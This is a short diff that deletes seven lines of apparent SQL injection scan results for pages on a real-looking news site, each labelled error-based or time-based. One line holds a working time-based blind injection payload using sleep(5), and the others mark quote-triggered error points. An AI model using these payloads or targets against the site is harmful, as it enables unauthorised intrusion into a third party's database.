@@ -1,7 +1,0 @@
-url: http://uo.alchevsk.su/news/index/25/%27, sqliType: SqliType.ERROR
-url: http://uo.alchevsk.su/news/index/15/%27, sqliType: SqliType.ERROR
-url: http://uo.alchevsk.su/news/index/30/%27, sqliType: SqliType.ERROR
-url: http://uo.alchevsk.su/news/index/40/%27, sqliType: SqliType.ERROR
-url: http://uo.alchevsk.su/news/7534/1'OR(if(1=1,sleep(5),0))--%20, sqliType: SqliType.TIME
-url: http://uo.alchevsk.su/news/index/20/%27, sqliType: SqliType.ERROR
-url: http://uo.alchevsk.su/news/index/10/%27, sqliType: SqliType.ERROR
